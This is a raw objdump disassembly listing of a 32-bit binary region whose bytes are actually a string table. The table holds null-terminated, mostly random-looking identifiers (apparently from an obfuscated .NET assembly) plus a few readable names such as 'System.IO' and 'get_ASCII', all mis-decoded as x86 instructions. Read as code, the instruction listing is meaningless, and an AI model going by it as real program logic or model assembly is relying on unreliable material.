  407590:	64 48                	fs dec %eax
  407592:	62 41 58             	bound  %eax,0x58(%ecx)
  407595:	43                   	inc    %ebx
  407596:	58                   	pop    %eax
  407597:	41                   	inc    %ecx
  407598:	00 50 4b             	add    %dl,0x4b(%eax)
  40759b:	53                   	push   %ebx
  40759c:	6f                   	outsl  %ds:(%esi),(%dx)
  40759d:	42                   	inc    %edx
  40759e:	47                   	inc    %edi
  40759f:	61                   	popa
  4075a0:	46                   	inc    %esi
  4075a1:	65 67 51             	gs addr16 push %ecx
  4075a4:	47                   	inc    %edi
  4075a5:	68 41 00 74 58       	push   $0x58740041
  4075aa:	57                   	push   %edi
  4075ab:	49                   	dec    %ecx
  4075ac:	4d                   	dec    %ebp
  4075ad:	66 54                	push   %sp
  4075af:	4d                   	dec    %ebp
  4075b0:	72 49                	jb     0x4075fb
  4075b2:	71 41                	jno    0x4075f5
  4075b4:	00 72 78             	add    %dh,0x78(%edx)
  4075b7:	67 75 52             	addr16 jne 0x40760c
  4075ba:	76 41                	jbe    0x4075fd
  4075bc:	4f                   	dec    %edi
  4075bd:	4e                   	dec    %esi
  4075be:	77 41                	ja     0x407601
  4075c0:	00 44 69 4a          	add    %al,0x4a(%ecx,%ebp,2)
  4075c4:	49                   	dec    %ecx
  4075c5:	6a 54                	push   $0x54
  4075c7:	74 67                	je     0x407630
  4075c9:	79 54                	jns    0x40761f
  4075cb:	53                   	push   %ebx
  4075cc:	42                   	inc    %edx
  4075cd:	00 44 55 58          	add    %al,0x58(%ebp,%edx,2)
  4075d1:	6d                   	insl   (%dx),%es:(%edi)
  4075d2:	61                   	popa
  4075d3:	53                   	push   %ebx
  4075d4:	4e                   	dec    %esi
  4075d5:	70 58                	jo     0x40762f
  4075d7:	45                   	inc    %ebp
  4075d8:	73 62                	jae    0x40763c
  4075da:	6c                   	insb   (%dx),%es:(%edi)
  4075db:	42                   	inc    %edx
  4075dc:	00 5a 6e             	add    %bl,0x6e(%edx)
  4075df:	6e                   	outsb  %ds:(%esi),(%dx)
  4075e0:	4c                   	dec    %esp
  4075e1:	70 61                	jo     0x407644
  4075e3:	69 5a 49 75 42 00 47 	imul   $0x47004275,0x49(%edx),%ebx
  4075ea:	43                   	inc    %ebx
  4075eb:	00 73 78             	add    %dh,0x78(%ebx)
  4075ee:	50                   	push   %eax
  4075ef:	52                   	push   %edx
  4075f0:	4e                   	dec    %esi
  4075f1:	68 73 69 63 47       	push   $0x47636973
  4075f6:	7a 6b                	jp     0x407663
  4075f8:	56                   	push   %esi
  4075f9:	43                   	inc    %ebx
  4075fa:	00 77 4c             	add    %dh,0x4c(%edi)
  4075fd:	53                   	push   %ebx
  4075fe:	77 47                	ja     0x407647
  407600:	72 43                	jb     0x407645
  407602:	4b                   	dec    %ebx
  407603:	62 57 43             	bound  %edx,0x43(%edi)
  407606:	00 65 4b             	add    %ah,0x4b(%ebp)
  407609:	44                   	inc    %esp
  40760a:	79 6e                	jns    0x40767a
  40760c:	5a                   	pop    %edx
  40760d:	52                   	push   %edx
  40760e:	77 52                	ja     0x407662
  407610:	56                   	push   %esi
  407611:	57                   	push   %edi
  407612:	50                   	push   %eax
  407613:	61                   	popa
  407614:	6c                   	insb   (%dx),%es:(%edi)
  407615:	43                   	inc    %ebx
  407616:	00 6c 68 49          	add    %ch,0x49(%eax,%ebp,2)
  40761a:	4f                   	dec    %edi
  40761b:	4f                   	dec    %edi
  40761c:	68 73 53 41 4a       	push   $0x4a415373
  407621:	71 6a                	jno    0x40768d
  407623:	72 43                	jb     0x407668
  407625:	00 51 6b             	add    %dl,0x6b(%ecx)
  407628:	6c                   	insb   (%dx),%es:(%edi)
  407629:	4f                   	dec    %edi
  40762a:	69 6e 53 57 6d 67 55 	imul   $0x55676d57,0x53(%esi),%ebp
  407631:	6e                   	outsb  %ds:(%esi),(%dx)
  407632:	77 43                	ja     0x407677
  407634:	00 58 63             	add    %bl,0x63(%eax)
  407637:	59                   	pop    %ecx
  407638:	44                   	inc    %esp
  407639:	6c                   	insb   (%dx),%es:(%edi)
  40763a:	5a                   	pop    %edx
  40763b:	4f                   	dec    %edi
  40763c:	6b 4c 42 44 00       	imul   $0x0,0x44(%edx,%eax,2),%ecx
  407641:	71 4c                	jno    0x40768f
  407643:	41                   	inc    %ecx
  407644:	6e                   	outsb  %ds:(%esi),(%dx)
  407645:	74 68                	je     0x4076af
  407647:	7a 58                	jp     0x4076a1
  407649:	4e                   	dec    %esi
  40764a:	63 69 43             	arpl   %ebp,0x43(%ecx)
  40764d:	43                   	inc    %ebx
  40764e:	44                   	inc    %esp
  40764f:	00 4d 61             	add    %cl,0x61(%ebp)
  407652:	70 4e                	jo     0x4076a2
  407654:	61                   	popa
  407655:	6d                   	insl   (%dx),%es:(%edi)
  407656:	65 54                	gs push %esp
  407658:	6f                   	outsl  %ds:(%esi),(%dx)
  407659:	4f                   	dec    %edi
  40765a:	49                   	dec    %ecx
  40765b:	44                   	inc    %esp
  40765c:	00 53 74             	add    %dl,0x74(%ebx)
  40765f:	6d                   	insl   (%dx),%es:(%edi)
  407660:	45                   	inc    %ebp
  407661:	55                   	push   %ebp
  407662:	48                   	dec    %eax
  407663:	70 63                	jo     0x4076c8
  407665:	73 70                	jae    0x4076d7
  407667:	50                   	push   %eax
  407668:	69 49 44 00 67 65 74 	imul   $0x74656700,0x44(%ecx),%ecx
  40766f:	5f                   	pop    %edi
  407670:	46                   	inc    %esi
  407671:	6f                   	outsl  %ds:(%esi),(%dx)
  407672:	72 6d                	jb     0x4076e1
  407674:	61                   	popa
  407675:	74 49                	je     0x4076c0
  407677:	44                   	inc    %esp
  407678:	00 47 5a             	add    %al,0x5a(%edi)
  40767b:	49                   	dec    %ecx
  40767c:	45                   	inc    %ebp
  40767d:	7a 76                	jp     0x4076f5
  40767f:	67 5a                	addr16 pop %edx
  407681:	4d                   	dec    %ebp
  407682:	44                   	inc    %esp
  407683:	00 5a 7a             	add    %bl,0x7a(%edx)
  407686:	62 6b 65             	bound  %ebp,0x65(%ebx)
  407689:	53                   	push   %ebx
  40768a:	54                   	push   %esp
  40768b:	6e                   	outsb  %ds:(%esi),(%dx)
  40768c:	75 49                	jne    0x4076d7
  40768e:	44                   	inc    %esp
  40768f:	4a                   	dec    %edx
  407690:	4a                   	dec    %edx
  407691:	56                   	push   %esi
  407692:	57                   	push   %edi
  407693:	44                   	inc    %esp
  407694:	00 4e 57             	add    %cl,0x57(%esi)
  407697:	68 46 49 46 45       	push   $0x45464946
  40769c:	57                   	push   %edi
  40769d:	7a 4d                	jp     0x4076ec
  40769f:	66 44                	inc    %sp
  4076a1:	00 72 41             	add    %dh,0x41(%edx)
  4076a4:	6a 78                	push   $0x78
  4076a6:	4f                   	dec    %edi
  4076a7:	6d                   	insl   (%dx),%es:(%edi)
  4076a8:	65 4b                	gs dec %ebx
  4076aa:	72 76                	jb     0x407722
  4076ac:	69 67 73 44 00 41 58 	imul   $0x58410044,0x73(%edi),%esp
  4076b3:	42                   	inc    %edx
  4076b4:	55                   	push   %ebp
  4076b5:	48                   	dec    %eax
  4076b6:	73 72                	jae    0x40772a
  4076b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4076b9:	70 4f                	jo     0x40770a
  4076bb:	64 45                	fs inc %ebp
  4076bd:	43                   	inc    %ebx
  4076be:	45                   	inc    %ebp
  4076bf:	00 71 6b             	add    %dh,0x6b(%ecx)
  4076c2:	51                   	push   %ecx
  4076c3:	66 6e                	data16 outsb %ds:(%esi),(%dx)
  4076c5:	75 6c                	jne    0x407733
  4076c7:	47                   	inc    %edi
  4076c8:	48                   	dec    %eax
  4076c9:	47                   	inc    %edi
  4076ca:	45                   	inc    %ebp
  4076cb:	00 6c 65 7a          	add    %ch,0x7a(%ebp,%eiz,2)
  4076cf:	6d                   	insl   (%dx),%es:(%edi)
  4076d0:	42                   	inc    %edx
  4076d1:	47                   	inc    %edi
  4076d2:	71 4a                	jno    0x40771e
  4076d4:	59                   	pop    %ecx
  4076d5:	49                   	dec    %ecx
  4076d6:	59                   	pop    %ecx
  4076d7:	67 53                	addr16 push %ebx
  4076d9:	51                   	push   %ecx
  4076da:	45                   	inc    %ebp
  4076db:	00 53 4b             	add    %dl,0x4b(%ebx)
  4076de:	74 61                	je     0x407741
  4076e0:	78 44                	js     0x407726
  4076e2:	45                   	inc    %ebp
  4076e3:	42                   	inc    %edx
  4076e4:	77 76                	ja     0x40775c
  4076e6:	55                   	push   %ebp
  4076e7:	45                   	inc    %ebp
  4076e8:	00 58 75             	add    %bl,0x75(%eax)
  4076eb:	47                   	inc    %edi
  4076ec:	76 53                	jbe    0x407741
  4076ee:	72 69                	jb     0x407759
  4076f0:	52                   	push   %edx
  4076f1:	67 56                	addr16 push %esi
  4076f3:	45                   	inc    %ebp
  4076f4:	00 58 71             	add    %bl,0x71(%eax)
  4076f7:	73 44                	jae    0x40773d
  4076f9:	79 48                	jns    0x407743
  4076fb:	4e                   	dec    %esi
  4076fc:	47                   	inc    %edi
  4076fd:	72 47                	jb     0x407746
  4076ff:	47                   	inc    %edi
  407700:	4d                   	dec    %ebp
  407701:	73 45                	jae    0x407748
  407703:	00 77 51             	add    %dh,0x51(%edi)
  407706:	65 52                	gs push %edx
  407708:	56                   	push   %esi
  407709:	55                   	push   %ebp
  40770a:	6d                   	insl   (%dx),%es:(%edi)
  40770b:	52                   	push   %edx
  40770c:	76 78                	jbe    0x407786
  40770e:	49                   	dec    %ecx
  40770f:	75 45                	jne    0x407756
  407711:	00 50 62             	add    %dl,0x62(%eax)
  407714:	69 44 6d 52 63 47 71 	imul   $0x43714763,0x52(%ebp,%ebp,2),%eax
  40771b:	43 
  40771c:	78 42                	js     0x407760
  40771e:	46                   	inc    %esi
  40771f:	00 66 48             	add    %ah,0x48(%esi)
  407722:	45                   	inc    %ebp
  407723:	65 73 52             	gs jae 0x407778
  407726:	55                   	push   %ebp
  407727:	43                   	inc    %ebx
  407728:	78 43                	js     0x40776d
  40772a:	46                   	inc    %esi
  40772b:	00 59 55             	add    %bl,0x55(%ecx)
  40772e:	51                   	push   %ecx
  40772f:	70 43                	jo     0x407774
  407731:	48                   	dec    %eax
  407732:	4f                   	dec    %edi
  407733:	4c                   	dec    %esp
  407734:	42                   	inc    %edx
  407735:	52                   	push   %edx
  407736:	46                   	inc    %esi
  407737:	00 54 64 44          	add    %dl,0x44(%esp,%eiz,2)
  40773b:	53                   	push   %ebx
  40773c:	47                   	inc    %edi
  40773d:	47                   	inc    %edi
  40773e:	45                   	inc    %ebp
  40773f:	54                   	push   %esp
  407740:	4c                   	dec    %esp
  407741:	65 49                	gs dec %ecx
  407743:	47                   	inc    %edi
  407744:	00 75 4d             	add    %dh,0x4d(%ebp)
  407747:	6f                   	outsl  %ds:(%esi),(%dx)
  407748:	58                   	pop    %eax
  407749:	77 42                	ja     0x40778d
  40774b:	64 62 79 51          	bound  %edi,%fs:0x51(%ecx)
  40774f:	4b                   	dec    %ebx
  407750:	47                   	inc    %edi
  407751:	00 47 46             	add    %al,0x46(%edi)
  407754:	42                   	inc    %edx
  407755:	72 6c                	jb     0x4077c3
  407757:	68 75 54 6e 4e       	push   $0x4e6e5475
  40775c:	47                   	inc    %edi
  40775d:	00 78 61             	add    %bh,0x61(%eax)
  407760:	70 53                	jo     0x4077b5
  407762:	55                   	push   %ebp
  407763:	6a 4d                	push   $0x4d
  407765:	43                   	inc    %ebx
  407766:	69 4f 57 6c 4d 64 47 	imul   $0x47644d6c,0x57(%edi),%ecx
  40776d:	00 76 53             	add    %dh,0x53(%esi)
  407770:	45                   	inc    %ebp
  407771:	4a                   	dec    %edx
  407772:	77 67                	ja     0x4077db
  407774:	4d                   	dec    %ebp
  407775:	59                   	pop    %ecx
  407776:	65 4e                	gs dec %esi
  407778:	42                   	inc    %edx
  407779:	48                   	dec    %eax
  40777a:	00 76 71             	add    %dh,0x71(%esi)
  40777d:	76 50                	jbe    0x4077cf
  40777f:	54                   	push   %esp
  407780:	4e                   	dec    %esi
  407781:	66 77 72             	data16 ja 0x4077f6
  407784:	54                   	push   %esp
  407785:	4a                   	dec    %edx
  407786:	48                   	dec    %eax
  407787:	00 70 77             	add    %dh,0x77(%eax)
  40778a:	6f                   	outsl  %ds:(%esi),(%dx)
  40778b:	47                   	inc    %edi
  40778c:	4c                   	dec    %esp
  40778d:	72 75                	jb     0x407804
  40778f:	62 5a 74             	bound  %ebx,0x74(%edx)
  407792:	4b                   	dec    %ebx
  407793:	48                   	dec    %eax
  407794:	00 4f 50             	add    %cl,0x50(%edi)
  407797:	44                   	inc    %esp
  407798:	50                   	push   %eax
  407799:	66 5a                	pop    %dx
  40779b:	49                   	dec    %ecx
  40779c:	68 63 51 6a 42       	push   $0x426a5163
  4077a1:	53                   	push   %ebx
  4077a2:	4c                   	dec    %esp
  4077a3:	48                   	dec    %eax
  4077a4:	00 70 69             	add    %dh,0x69(%eax)
  4077a7:	6b 70 48 51          	imul   $0x51,0x48(%eax),%esi
  4077ab:	4f                   	dec    %edi
  4077ac:	49                   	dec    %ecx
  4077ad:	6a 59                	push   $0x59
  4077af:	6c                   	insb   (%dx),%es:(%edi)
  4077b0:	48                   	dec    %eax
  4077b1:	00 76 44             	add    %dh,0x44(%esi)
  4077b4:	4e                   	dec    %esi
  4077b5:	62 6a 64             	bound  %ebp,0x64(%edx)
  4077b8:	6c                   	insb   (%dx),%es:(%edi)
  4077b9:	68 62 59 46 49       	push   $0x49465962
  4077be:	00 67 65             	add    %ah,0x65(%edi)
  4077c1:	74 5f                	je     0x407822
  4077c3:	41                   	inc    %ecx
  4077c4:	53                   	push   %ebx
  4077c5:	43                   	inc    %ebx
  4077c6:	49                   	dec    %ecx
  4077c7:	49                   	dec    %ecx
  4077c8:	00 67 50             	add    %ah,0x50(%edi)
  4077cb:	52                   	push   %edx
  4077cc:	63 67 46             	arpl   %esp,0x46(%edi)
  4077cf:	73 6f                	jae    0x407840
  4077d1:	6c                   	insb   (%dx),%es:(%edi)
  4077d2:	73 4a                	jae    0x40781e
  4077d4:	49                   	dec    %ecx
  4077d5:	00 4c 62 4f          	add    %cl,0x4f(%edx,%eiz,2)
  4077d9:	56                   	push   %esi
  4077da:	41                   	inc    %ecx
  4077db:	77 57                	ja     0x407834
  4077dd:	6c                   	insb   (%dx),%es:(%edi)
  4077de:	66 71 75             	data16 jno 0x407856
  4077e1:	48                   	dec    %eax
  4077e2:	71 4f                	jno    0x407833
  4077e4:	49                   	dec    %ecx
  4077e5:	00 7a 4a             	add    %bh,0x4a(%edx)
  4077e8:	70 59                	jo     0x407843
  4077ea:	70 6a                	jo     0x407856
  4077ec:	70 5a                	jo     0x407848
  4077ee:	71 41                	jno    0x407831
  4077f0:	42                   	inc    %edx
  4077f1:	50                   	push   %eax
  4077f2:	49                   	dec    %ecx
  4077f3:	00 4e 4d             	add    %cl,0x4d(%esi)
  4077f6:	67 4b                	addr16 dec %ebx
  4077f8:	58                   	pop    %eax
  4077f9:	4e                   	dec    %esi
  4077fa:	57                   	push   %edi
  4077fb:	41                   	inc    %ecx
  4077fc:	75 45                	jne    0x407843
  4077fe:	67 59                	addr16 pop %ecx
  407800:	61                   	popa
  407801:	49                   	dec    %ecx
  407802:	00 49 75             	add    %cl,0x75(%ecx)
  407805:	4f                   	dec    %edi
  407806:	4f                   	dec    %edi
  407807:	58                   	pop    %eax
  407808:	53                   	push   %ebx
  407809:	54                   	push   %esp
  40780a:	52                   	push   %edx
  40780b:	56                   	push   %esi
  40780c:	4a                   	dec    %edx
  40780d:	56                   	push   %esi
  40780e:	69 49 00 4e 4f 61 4e 	imul   $0x4e614f4e,0x0(%ecx),%ecx
  407815:	79 7a                	jns    0x407891
  407817:	41                   	inc    %ecx
  407818:	68 71 79 78 49       	push   $0x49787971
  40781d:	00 4e 50             	add    %cl,0x50(%esi)
  407820:	4c                   	dec    %esp
  407821:	6f                   	outsl  %ds:(%esi),(%dx)
  407822:	76 72                	jbe    0x407896
  407824:	65 58                	gs pop %eax
  407826:	46                   	inc    %esi
  407827:	48                   	dec    %eax
  407828:	54                   	push   %esp
  407829:	68 79 49 00 4d       	push   $0x4d004979
  40782e:	4b                   	dec    %ebx
  40782f:	4a                   	dec    %edx
  407830:	51                   	push   %ecx
  407831:	68 51 54 46 68       	push   $0x68465451
  407836:	45                   	inc    %ebp
  407837:	4a                   	dec    %edx
  407838:	00 54 44 43          	add    %dl,0x43(%esp,%eax,2)
  40783c:	4e                   	dec    %esi
  40783d:	55                   	push   %ebp
  40783e:	65 62 58 50          	bound  %ebx,%gs:0x50(%eax)
  407842:	50                   	push   %eax
  407843:	56                   	push   %esi
  407844:	4d                   	dec    %ebp
  407845:	4a                   	dec    %edx
  407846:	00 4f 61             	add    %cl,0x61(%edi)
  407849:	51                   	push   %ecx
  40784a:	42                   	inc    %edx
  40784b:	63 7a 54             	arpl   %edi,0x54(%edx)
  40784e:	54                   	push   %esp
  40784f:	69 48 61 4a 00 41 53 	imul   $0x5341004a,0x61(%eax),%ecx
  407856:	55                   	push   %ebp
  407857:	7a 48                	jp     0x4078a1
  407859:	44                   	inc    %esp
  40785a:	63 4f 45             	arpl   %ecx,0x45(%edi)
  40785d:	72 6c                	jb     0x4078cb
  40785f:	63 4a 00             	arpl   %ecx,0x0(%edx)
  407862:	64 57                	fs push %edi
  407864:	6a 57                	push   $0x57
  407866:	7a 79                	jp     0x4078e1
  407868:	70 70                	jo     0x4078da
  40786a:	48                   	dec    %eax
  40786b:	62 57 51             	bound  %edx,0x51(%edi)
  40786e:	65 4a                	gs dec %edx
  407870:	00 43 74             	add    %al,0x74(%ebx)
  407873:	76 41                	jbe    0x4078b6
  407875:	5a                   	pop    %edx
  407876:	5a                   	pop    %edx
  407877:	66 66 41             	data16 inc %cx
  40787a:	6d                   	insl   (%dx),%es:(%edi)
  40787b:	5a                   	pop    %edx
  40787c:	66 69 4a 00 43 6e    	imul   $0x6e43,0x0(%edx),%cx
  407882:	75 5a                	jne    0x4078de
  407884:	6f                   	outsl  %ds:(%esi),(%dx)
  407885:	75 4a                	jne    0x4078d1
  407887:	48                   	dec    %eax
  407888:	55                   	push   %ebp
  407889:	54                   	push   %esp
  40788a:	44                   	inc    %esp
  40788b:	73 4a                	jae    0x4078d7
  40788d:	00 4d 6e             	add    %cl,0x6e(%ebp)
  407890:	58                   	pop    %eax
  407891:	6c                   	insb   (%dx),%es:(%edi)
  407892:	59                   	pop    %ecx
  407893:	44                   	inc    %esp
  407894:	48                   	dec    %eax
  407895:	55                   	push   %ebp
  407896:	58                   	pop    %eax
  407897:	77 44                	ja     0x4078dd
  407899:	74 4a                	je     0x4078e5
  40789b:	00 79 54             	add    %bh,0x54(%ecx)
  40789e:	6f                   	outsl  %ds:(%esi),(%dx)
  40789f:	72 4b                	jb     0x4078ec
  4078a1:	47                   	inc    %edi
  4078a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4078a3:	7a 43                	jp     0x4078e8
  4078a5:	78 4a                	js     0x4078f1
  4078a7:	46                   	inc    %esi
  4078a8:	51                   	push   %ecx
  4078a9:	7a 4a                	jp     0x4078f5
  4078ab:	00 67 75             	add    %ah,0x75(%edi)
  4078ae:	44                   	inc    %esp
  4078af:	53                   	push   %ebx
  4078b0:	72 79                	jb     0x40792b
  4078b2:	4a                   	dec    %edx
  4078b3:	75 62                	jne    0x407917
  4078b5:	74 72                	je     0x407929
  4078b7:	79 41                	jns    0x4078fa
  4078b9:	4b                   	dec    %ebx
  4078ba:	00 6e 52             	add    %ch,0x52(%esi)
  4078bd:	49                   	dec    %ecx
  4078be:	62 6c 72 49          	bound  %ebp,0x49(%edx,%esi,2)
  4078c2:	79 52                	jns    0x407916
  4078c4:	6a 46                	push   $0x46
  4078c6:	50                   	push   %eax
  4078c7:	5a                   	pop    %edx
  4078c8:	4b                   	dec    %ebx
  4078c9:	00 4a 55             	add    %cl,0x55(%edx)
  4078cc:	5a                   	pop    %edx
  4078cd:	78 6d                	js     0x40793c
  4078cf:	75 68                	jne    0x407939
  4078d1:	51                   	push   %ecx
  4078d2:	6b 4f 72 68          	imul   $0x68,0x72(%edi),%ecx
  4078d6:	4b                   	dec    %ebx
  4078d7:	00 6a 77             	add    %ch,0x77(%edx)
  4078da:	4b                   	dec    %ebx
  4078db:	4a                   	dec    %edx
  4078dc:	4c                   	dec    %esp
  4078dd:	62 77 58             	bound  %esi,0x58(%edi)
  4078e0:	43                   	inc    %ebx
  4078e1:	76 6c                	jbe    0x40794f
  4078e3:	4b                   	dec    %ebx
  4078e4:	00 7a 72             	add    %bh,0x72(%edx)
  4078e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4078e8:	6a 6d                	push   $0x6d
  4078ea:	62 62 61             	bound  %esp,0x61(%edx)
  4078ed:	79 67                	jns    0x407956
  4078ef:	71 4a                	jno    0x40793b
  4078f1:	74 4b                	je     0x40793e
  4078f3:	00 6a 71             	add    %ch,0x71(%edx)
  4078f6:	4b                   	dec    %ebx
  4078f7:	69 46 50 6b 44 67 76 	imul   $0x7667446b,0x50(%esi),%eax
  4078fe:	4b                   	dec    %ebx
  4078ff:	00 66 78             	add    %ah,0x78(%esi)
  407902:	46                   	inc    %esi
  407903:	49                   	dec    %ecx
  407904:	78 6d                	js     0x407973
  407906:	78 51                	js     0x407959
  407908:	42                   	inc    %edx
  407909:	4c                   	dec    %esp
  40790a:	78 4b                	js     0x407957
  40790c:	00 4a 72             	add    %cl,0x72(%edx)
  40790f:	59                   	pop    %ecx
  407910:	4a                   	dec    %edx
  407911:	4e                   	dec    %esi
  407912:	47                   	inc    %edi
  407913:	56                   	push   %esi
  407914:	57                   	push   %edi
  407915:	79 4b                	jns    0x407962
  407917:	00 55 53             	add    %dl,0x53(%ebp)
  40791a:	76 4d                	jbe    0x407969
  40791c:	6a 74                	push   $0x74
  40791e:	72 41                	jb     0x407961
  407920:	74 45                	je     0x407967
  407922:	48                   	dec    %eax
  407923:	6b 51 6a 62          	imul   $0x62,0x6a(%ecx),%edx
  407927:	4c                   	dec    %esp
  407928:	00 70 6a             	add    %dh,0x6a(%eax)
  40792b:	50                   	push   %eax
  40792c:	79 7a                	jns    0x4079a8
  40792e:	52                   	push   %edx
  40792f:	67 43                	addr16 inc %ebx
  407931:	50                   	push   %eax
  407932:	6c                   	insb   (%dx),%es:(%edi)
  407933:	69 4c 00 43 6e 54 6a 	imul   $0x786a546e,0x43(%eax,%eax,1),%ecx
  40793a:	78 
  40793b:	6c                   	insb   (%dx),%es:(%edi)
  40793c:	51                   	push   %ecx
  40793d:	65 73 6e             	gs jae 0x4079ae
  407940:	74 62                	je     0x4079a4
  407942:	7a 4c                	jp     0x407990
  407944:	00 4f 4d             	add    %cl,0x4d(%edi)
  407947:	6b 74 51 4d 41       	imul   $0x41,0x4d(%ecx,%edx,2),%esi
  40794c:	43                   	inc    %ebx
  40794d:	63 68 57             	arpl   %ebp,0x57(%eax)
  407950:	65 4b                	gs dec %ebx
  407952:	43                   	inc    %ebx
  407953:	4d                   	dec    %ebp
  407954:	00 4f 70             	add    %cl,0x70(%edi)
  407957:	75 56                	jne    0x4079af
  407959:	45                   	inc    %ebp
  40795a:	5a                   	pop    %edx
  40795b:	6e                   	outsb  %ds:(%esi),(%dx)
  40795c:	49                   	dec    %ecx
  40795d:	63 47 5a             	arpl   %eax,0x5a(%edi)
  407960:	4d                   	dec    %ebp
  407961:	00 7a 50             	add    %bh,0x50(%edx)
  407964:	68 6a 6e 79 47       	push   $0x47796e6a
  407969:	6a 58                	push   $0x58
  40796b:	74 72                	je     0x4079df
  40796d:	78 4a                	js     0x4079b9
  40796f:	59                   	pop    %ecx
  407970:	67 4d                	addr16 dec %ebp
  407972:	00 62 47             	add    %ah,0x47(%edx)
  407975:	4c                   	dec    %esp
  407976:	4e                   	dec    %esi
  407977:	4f                   	dec    %edi
  407978:	65 76 5a             	gs jbe 0x4079d5
  40797b:	4f                   	dec    %edi
  40797c:	56                   	push   %esi
  40797d:	5a                   	pop    %edx
  40797e:	72 68                	jb     0x4079e8
  407980:	68 4d 00 79 6f       	push   $0x6f79004d
  407985:	66 51                	push   %cx
  407987:	4d                   	dec    %ebp
  407988:	63 4a 67             	arpl   %ecx,0x67(%edx)
  40798b:	70 4d                	jo     0x4079da
  40798d:	00 54 4f 55          	add    %dl,0x55(%edi,%ecx,2)
  407991:	69 41 41 78 55 41 58 	imul   $0x58415578,0x41(%ecx),%eax
  407998:	72 78                	jb     0x407a12
  40799a:	78 65                	js     0x407a01
  40799c:	75 71                	jne    0x407a0f
  40799e:	4d                   	dec    %ebp
  40799f:	00 53 49             	add    %dl,0x49(%ebx)
  4079a2:	4a                   	dec    %edx
  4079a3:	73 69                	jae    0x407a0e
  4079a5:	54                   	push   %esp
  4079a6:	46                   	inc    %esi
  4079a7:	74 68                	je     0x407a11
  4079a9:	72 72                	jb     0x407a1d
  4079ab:	4d                   	dec    %ebp
  4079ac:	00 73 4b             	add    %dh,0x4b(%ebx)
  4079af:	63 41 55             	arpl   %eax,0x55(%ecx)
  4079b2:	62 51 49             	bound  %edx,0x49(%ecx)
  4079b5:	46                   	inc    %esi
  4079b6:	55                   	push   %ebp
  4079b7:	71 56                	jno    0x407a0f
  4079b9:	74 4d                	je     0x407a08
  4079bb:	00 75 73             	add    %dh,0x73(%ebp)
  4079be:	77 56                	ja     0x407a16
  4079c0:	53                   	push   %ebx
  4079c1:	7a 63                	jp     0x407a26
  4079c3:	58                   	pop    %eax
  4079c4:	4a                   	dec    %edx
  4079c5:	43                   	inc    %ebx
  4079c6:	4e                   	dec    %esi
  4079c7:	00 75 58             	add    %dh,0x58(%ebp)
  4079ca:	57                   	push   %edi
  4079cb:	62 76 45             	bound  %esi,0x45(%esi)
  4079ce:	67 4c                	addr16 dec %esp
  4079d0:	65 43                	gs inc %ebx
  4079d2:	4e                   	dec    %esi
  4079d3:	00 5a 52             	add    %bl,0x52(%edx)
  4079d6:	66 49                	dec    %cx
  4079d8:	6d                   	insl   (%dx),%es:(%edi)
  4079d9:	78 56                	js     0x407a31
  4079db:	6e                   	outsb  %ds:(%esi),(%dx)
  4079dc:	6b 6b 44 4e          	imul   $0x4e,0x44(%ebx),%ebp
  4079e0:	00 54 73 44          	add    %dl,0x44(%ebx,%esi,2)
  4079e4:	77 68                	ja     0x407a4e
  4079e6:	4a                   	dec    %edx
  4079e7:	50                   	push   %eax
  4079e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4079e9:	66 41                	inc    %cx
  4079eb:	63 49 5a             	arpl   %ecx,0x5a(%ecx)
  4079ee:	4e                   	dec    %esi
  4079ef:	00 59 50             	add    %bl,0x50(%ecx)
  4079f2:	6b 4f 41 53          	imul   $0x53,0x41(%edi),%ecx
  4079f6:	4b                   	dec    %ebx
  4079f7:	4f                   	dec    %edi
  4079f8:	68 59 68 72 5a       	push   $0x5a726859
  4079fd:	4e                   	dec    %esi
  4079fe:	00 49 72             	add    %cl,0x72(%ecx)
  407a01:	65 44                	gs inc %esp
  407a03:	47                   	inc    %edi
  407a04:	65 58                	gs pop %eax
  407a06:	45                   	inc    %ebp
  407a07:	57                   	push   %edi
  407a08:	45                   	inc    %ebp
  407a09:	68 4e 00 74 6f       	push   $0x6f74004e
  407a0e:	4a                   	dec    %edx
  407a0f:	67 70 4d             	addr16 jo 0x407a5f
  407a12:	47                   	inc    %edi
  407a13:	68 51 79 6d 4e       	push   $0x4e6d7951
  407a18:	00 62 48             	add    %ah,0x48(%edx)
  407a1b:	64 4f                	fs dec %edi
  407a1d:	6b 50 7a 76          	imul   $0x76,0x7a(%eax),%edx
  407a21:	4b                   	dec    %ebx
  407a22:	55                   	push   %ebp
  407a23:	6e                   	outsb  %ds:(%esi),(%dx)
  407a24:	4e                   	dec    %esi
  407a25:	00 4c 51 45          	add    %cl,0x45(%ecx,%edx,2)
  407a29:	6b 74 51 64 46       	imul   $0x46,0x64(%ecx,%edx,2),%esi
  407a2e:	75 67                	jne    0x407a97
  407a30:	67 71 4e             	addr16 jno 0x407a81
  407a33:	00 48 49             	add    %cl,0x49(%eax)
  407a36:	79 6d                	jns    0x407aa5
  407a38:	52                   	push   %edx
  407a39:	45                   	inc    %ebp
  407a3a:	62 50 45             	bound  %edx,0x45(%eax)
  407a3d:	51                   	push   %ecx
  407a3e:	43                   	inc    %ebx
  407a3f:	45                   	inc    %ebp
  407a40:	4f                   	dec    %edi
  407a41:	00 53 79             	add    %dl,0x79(%ebx)
  407a44:	73 74                	jae    0x407aba
  407a46:	65 6d                	gs insl (%dx),%es:(%edi)
  407a48:	2e 49                	cs dec %ecx
  407a4a:	4f                   	dec    %edi
  407a4b:	00 4e 49             	add    %cl,0x49(%esi)
  407a4e:	52                   	push   %edx
  407a4f:	43                   	inc    %ebx
  407a50:	57                   	push   %edi
  407a51:	50                   	push   %eax
  407a52:	67 46                	addr16 inc %esi
  407a54:	4a                   	dec    %edx
  407a55:	55                   	push   %ebp
  407a56:	4f                   	dec    %edi
  407a57:	00 59 7a             	add    %bl,0x7a(%ecx)
  407a5a:	6a 69                	push   $0x69
  407a5c:	49                   	dec    %ecx
  407a5d:	44                   	inc    %esp
  407a5e:	54                   	push   %esp
  407a5f:	41                   	inc    %ecx
  407a60:	43                   	inc    %ebx
  407a61:	54                   	push   %esp
  407a62:	59                   	pop    %ecx
  407a63:	4f                   	dec    %edi
  407a64:	00 67 6d             	add    %ah,0x6d(%edi)
  407a67:	4e                   	dec    %esi
  407a68:	74 58                	je     0x407ac2
  407a6a:	50                   	push   %eax
  407a6b:	64 4f                	fs dec %edi
  407a6d:	78 48                	js     0x407ab7
  407a6f:	63 4f 00             	arpl   %ecx,0x0(%edi)
